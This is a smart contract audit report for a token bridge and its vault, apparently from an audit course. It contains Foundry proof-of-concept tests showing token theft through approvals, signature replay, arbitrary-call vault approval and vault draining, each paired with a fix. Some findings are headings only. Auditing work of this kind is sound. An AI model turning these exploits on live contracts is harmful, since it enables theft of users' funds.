# Findings

## High 

### [H-1] Users who give tokens approvals to `L1BossBridge` may have those assets stolen

The `depositTokensToL2` function allows anyone to call it with a `from` address of any account that has approved tokens to the bridge.

As a consequence, an attacker can move tokens out of any victim account whose token allowance to the bridge is greater than zero. This will move the tokens into the bridge vault, and assign them to the attacker's address in L2 (setting an attacker-controlled address in the `l2Recipient` parameter).

As a PoC, include the following test in the `L1BossBridge.t.sol` file:

```javascript
function testCanMoveApprovedTokensOfOtherUsers() public {
    vm.prank(user);
    token.approve(address(tokenBridge), type(uint256).max);

    uint256 depositAmount = token.balanceOf(user);
    vm.startPrank(attacker);
    vm.expectEmit(address(tokenBridge));
    emit Deposit(user, attackerInL2, depositAmount);
    tokenBridge.depositTokensToL2(user, attackerInL2, depositAmount);

    assertEq(token.balanceOf(user), 0);
    assertEq(token.balanceOf(address(vault)), depositAmount);
    vm.stopPrank();
}
```

Consider modifying the `depositTokensToL2` function so that the caller cannot specify a `from` address.

```diff
- function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
+ function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
    if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
        revert L1BossBridge__DepositLimitReached();
    }
-   token.transferFrom(from, address(vault), amount);
+   token.transferFrom(msg.sender, address(vault), amount);

    // Our off-chain service picks up this event and mints the corresponding tokens on L2
-   emit Deposit(from, l2Recipient, amount);
+   emit Deposit(msg.sender, l2Recipient, amount);
}
```

### [H-2] Calling `depositTokensToL2` from the Vault contract to the Vault contract allows infinite minting of unbacked tokens

`depositTokensToL2` function allows the caller to specify the `from` address, from which tokens are taken.

Because the vault grants infinite approval to the bridge already (as can be seen in the contract's constructor), it's possible for an attacker to call the `depositTokensToL2` function and transfer tokens from the vault to the vault itself. This would allow the attacker to trigger the `Deposit` event any number of times, presumably causing the minting of unbacked tokens in L2.

Additionally, they could mint all the tokens to themselves. 

As a PoC, include the following test in the `L1TokenBridge.t.sol` file:

```javascript
function testCanTransferFromVaultToVault() public {
    vm.startPrank(attacker);

    // assume the vault already holds some tokens
    uint256 vaultBalance = 500 ether;
    deal(address(token), address(vault), vaultBalance);

    // Can trigger the `Deposit` event self-transferring tokens in the vault
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(vault), address(vault), vaultBalance);
    tokenBridge.depositTokensToL2(address(vault), address(vault), vaultBalance);

    // Any number of times
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(vault), address(vault), vaultBalance);
    tokenBridge.depositTokensToL2(address(vault), address(vault), vaultBalance);

    vm.stopPrank();
}
```

As suggested in H-1, consider modifying the `depositTokensToL2` function so that the caller cannot specify a `from` address.

### [H-3] Lack of replay protection in `withdrawTokensToL1` allows withdrawals by signature to be replayed

Users who want to withdraw tokens from the bridge can call the `sendToL1` function, or the wrapper `withdrawTokensToL1` function. These functions require the caller to send along some withdrawal data signed by one of the approved bridge operators.

However, the signatures do not include any kind of replay-protection mechanisn (e.g., nonces). Therefore, valid signatures from any  bridge operator can be reused by any attacker to continue executing withdrawals until the vault is completely drained.

As a PoC, include the following test in the `L1TokenBridge.t.sol` file:

```javascript
function testCanReplayWithdrawals() public {
    // Assume the vault already holds some tokens
    uint256 vaultInitialBalance = 1000e18;
    uint256 attackerInitialBalance = 100e18;
    deal(address(token), address(vault), vaultInitialBalance);
    deal(address(token), address(attacker), attackerInitialBalance);

    // An attacker deposits tokens to L2
    vm.startPrank(attacker);
    token.approve(address(tokenBridge), type(uint256).max);
    tokenBridge.depositTokensToL2(attacker, attackerInL2, attackerInitialBalance);

    // Operator signs withdrawal.
    (uint8 v, bytes32 r, bytes32 s) =
        _signMessage(_getTokenWithdrawalMessage(attacker, attackerInitialBalance), operator.key);

    // The attacker can reuse the signature and drain the vault.
    while (token.balanceOf(address(vault)) > 0) {
        tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
    }
    assertEq(token.balanceOf(address(attacker)), attackerInitialBalance + vaultInitialBalance);
    assertEq(token.balanceOf(address(vault)), 0);
}
```

Consider redesigning the withdrawal mechanism so that it includes replay protection.

### [H-4] `L1BossBridge::sendToL1` allowing arbitrary calls enables users to call `L1Vault::approveTo` and give themselves infinite allowance of vault funds

The `L1BossBridge` contract includes the `sendToL1` function that, if called with a valid signature by an operator, can execute arbitrary low-level calls to any given target. Because there's no restrictions neither on the target nor the calldata, this call could be used by an attacker to execute sensitive contracts of the bridge. For example, the `L1Vault` contract.

The `L1BossBridge` contract owns the `L1Vault` contract. Therefore, an attacker could submit a call that targets the vault and executes is `approveTo` function, passing an attacker-controlled address to increase its allowance. This would then allow the attacker to completely drain the vault.

It's worth noting that this attack's likelihood depends on the level of sophistication of the off-chain validations implemented by the operators that approve and sign withdrawals. However, we're rating it as a High severity issue because, according to the available documentation, the only validation made by off-chain services is that "the account submitting the withdrawal has first originated a successful deposit in the L1 part of the bridge". As the next PoC shows, such validation is not enough to prevent the attack.

To reproduce, include the following test in the `L1BossBridge.t.sol` file:

```javascript
function testCanCallVaultApproveFromBridgeAndDrainVault() public {
    uint256 vaultInitialBalance = 1000e18;
    deal(address(token), address(vault), vaultInitialBalance);

    // An attacker deposits tokens to L2. We do this under the assumption that the
    // bridge operator needs to see a valid deposit tx to then allow us to request a withdrawal.
    vm.startPrank(attacker);
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(attacker), address(0), 0);
    tokenBridge.depositTokensToL2(attacker, address(0), 0);

    // Under the assumption that the bridge operator doesn't validate bytes being signed
    bytes memory message = abi.encode(
        address(vault), // target
        0, // value
        abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max)) // data
    );
    (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);

    tokenBridge.sendToL1(v, r, s, message);
    assertEq(token.allowance(address(vault), attacker), type(uint256).max);
    token.transferFrom(address(vault), attacker, token.balanceOf(address(vault)));
}
```

Consider disallowing attacker-controlled external calls to sensitive components of the bridge, such as the `L1Vault` contract.



### [H-5] `CREATE` opcode does not work on zksync era

### [H-6] `L1BossBridge::depositTokensToL2`'s `DEPOSIT_LIMIT` check allows contract to be DoS'd

The `L1BossBridge::depositTokensToL2()` function enforces a fixed upper limit on the total amount of tokens allowed in the bridge's vault:

```javascript
if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
    revert L1BossBridge__DepositLimitReached();
}
```

This check is used to ensure that the vault does not exceed a pre-defined threshold of tokens. While the intent is likely to limit risk exposure, this design can cause the entire bridge to become unusable for deposits once the limit is reached.
Since the `DEPOSIT_LIMIT` is a hard cap, once the total balance in the vault meets or exceeds it—even temporarily—no further deposits are possible, potentially locking the bridge for all users.


### [H-7] The `L1BossBridge::withdrawTokensToL1` function has no validation on the withdrawal amount being the same as the deposited amount in `L1BossBridge::depositTokensToL2`, allowing attacker to withdraw more funds than deposited 

**Description:** The withdrawTokensToL1 function allows users to withdraw tokens from the vault based on a signed message from a trusted off-chain signer. However, the contract does not perform any internal validation to ensure that the amount being withdrawn matches the amount previously deposited by the user in depositTokensToL2.
Since the system relies on events and off-chain monitoring to mint tokens on L2 and sign withdrawals on L1, a malicious or compromised off-chain actor (or a replayed signature) can enable over-withdrawal from the vault, potentially draining all funds.

**Impact:** 
- Critical fund loss risk due to unvalidated or improperly tracked withdrawal requests.
- A user can withdraw more tokens than they deposited on L1.
- Since no on-chain accounting (like a mapping of user balances) is used, there's no limit or sanity check against over-withdrawal or replay of stale/fake deposits.
- If the off-chain signer is compromised or malfunctions, an attacker can drain the vault without ever depositing legitimate tokens.

**Proof Of Concept:** Add the following lines to the test file :
```javascript

    function testCanDrainMoreFunds() public {
        uint256 amount = 1000 ether;

        uint256 vaultInitialBalance = 1000e18;
        uint256 attackerInitialBalance = 100e18;
        address attacker = makeAddr("attacker");
        deal(address(token), address(vault), vaultInitialBalance);
        deal(address(token), address(attacker), attackerInitialBalance);
        vm.startPrank(attacker);
        token.approve(address(tokenBridge), type(uint256).max);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(attacker, attacker, attackerInitialBalance);
        tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(abi.encode(address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, amount))))));
        tokenBridge.withdrawTokensToL1(attacker, amount, v, r, s);

        assertEq(token.balanceOf(address(vault)), vaultInitialBalance - amount);    
        assertEq(token.balanceOf(address(attacker)), attackerInitialBalance + amount);
        vm.stopPrank();
    }
```
**Required Mitigations:** 
Track deposits per user and then validate the requested amount in the withdraw function as :

```diff
+ mapping(address => uint256) private s_userDeposits;

function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
    ...
+   s_userDeposits[from] += amount;
    emit Deposit(from, l2Recipient, amount);
}

function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
+   require(s_userDeposits[to] >= amount, "Over-withdrawal attempt");
+   s_userDeposits[to] -= amount;

    sendToL1(
        v,
        r,
        s,
        abi.encode(
            address(token),
            0,
            abi.encodeCall(IERC20.transferFrom, (address(vault), to, amount))
        )
    );
}
```

### [H-8] `TokenFactory::deployToken` locks tokens forever 
**Description:** The TokenFactory contract uses inline assembly with the low-level create opcode to deploy new ERC20 tokens from raw bytecode. However, the deployment process lacks validation checks, such as confirming whether the contract was successfully deployed or ensuring the contract adheres to the ERC20 standard. Additionally, if the constructor of the deployed contract mints tokens to the TokenFactory contract itself (i.e., address(this)), and the factory does not provide any mechanism to withdraw those tokens, they become permanently inaccessible, effectively locked forever.

This issue is especially critical when deploying on chains like zkSync Era, where the use of low-level create can be problematic or unsupported, further increasing the likelihood of silent failures.

**Impact:**
1. If deployment fails, the function stores a zero address in the symbol mapping, resulting in future interaction failures.
2. Tokens minted to the TokenFactory contract will be inaccessible forever, as the contract does not include a withdrawal mechanism.
3. The symbol-to-address mapping can be poisoned by failed or invalid deployments, making those symbols unusable or misleading.
4. On zkSync Era, inline assembly using create may fail silently or behave unexpectedly, worsening the issue.

**Proof Of Concept:** 
Given the original `TokenFactory.sol` code : 
```javascript
function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr) {
    assembly {
        addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
    }
    s_tokenToAddress[symbol] = addr;
    emit TokenDeployed(symbol, addr);
}
```
1. Deployment fails 
If `create()` fails, it returns `address(0)`, yet the contract still assigns it to the symbol:

```javascript
s_tokenToAddress[symbol] = addr; // addr == 0x0
```

This leads to:
- An invalid address being used for the token.
- Permanent pollution of the mapping.

2. Locked Tokens Scenario
Suppose the ERC20 constructor mints tokens to the deployer (address(this)):

```javascript
constructor(...) ERC20("Token", "TKN") {
    _mint(msg.sender, 1000 * 1e18);
}
```

Since TokenFactory is the deployer:
It receives 1000 tokens.
But TokenFactory has no function to transfer them out, locking them forever.

**Required Mitigations:** Replace the `TokenFactory::deployToken()` function with the following code :

```diff
function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr) {
    assembly {
        addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
    }

+   require(addr != address(0), "Token deployment failed");
    s_tokenToAddress[symbol] = addr;
    emit TokenDeployed(symbol, addr);
}

+function rescueTokens(address token, address to, uint256 amount) external onlyOwner {
+    require(IERC20(token).transfer(to, amount), "Rescue transfer failed");
+}
```
## Medium

### [M-1] Withdrawals are prone to unbounded gas consumption due to return bombs

During withdrawals, the L1 part of the bridge executes a low-level call to an arbitrary target passing all available gas. While this would work fine for regular targets, it may not for adversarial ones.

In particular, a malicious target may drop a [return bomb](https://github.com/nomad-xyz/ExcessivelySafeCall) to the caller. This would be done by returning an large amount of returndata in the call, which Solidity would copy to memory, thus increasing gas costs due to the expensive memory operations. Callers unaware of this risk may not set the transaction's gas limit sensibly, and therefore be tricked to spent more ETH than necessary to execute the call.

If the external call's returndata is not to be used, then consider modifying the call to avoid copying any of the data. This can be done in a custom implementation, or reusing external libraries such as [this one](https://github.com/nomad-xyz/ExcessivelySafeCall).

## Low

### [L-1] Lack of event emission during withdrawals and sending tokesn to L1

Neither the `sendToL1` function nor the `withdrawTokensToL1` function emit an event when a withdrawal operation is successfully executed. This prevents off-chain monitoring mechanisms to monitor withdrawals and raise alerts on suspicious scenarios.

Modify the `sendToL1` function to include a new event that is always emitted upon completing withdrawals.

*Not shown in video*
### [L-2] `TokenFactory::deployToken` can create multiple token with same `symbol`

*Not shown in video*
### [L-3] Unsupported opcode PUSH0

## Informational

### [I-1] Insufficient test coverage

```
Running tests...
| File                 | % Lines        | % Statements   | % Branches    | % Funcs       |
| -------------------- | -------------- | -------------- | ------------- | ------------- |
| src/L1BossBridge.sol | 86.67% (13/15) | 90.00% (18/20) | 83.33% (5/6)  | 83.33% (5/6)  |
| src/L1Vault.sol      | 0.00% (0/1)    | 0.00% (0/1)    | 100.00% (0/0) | 0.00% (0/1)   |
| src/TokenFactory.sol | 100.00% (4/4)  | 100.00% (4/4)  | 100.00% (0/0) | 100.00% (2/2) |
| Total                | 85.00% (17/20) | 88.00% (22/25) | 83.33% (5/6)  | 77.78% (7/9)  |
```

**Recommended Mitigation:** Aim to get test coverage up to over 90% for all files.
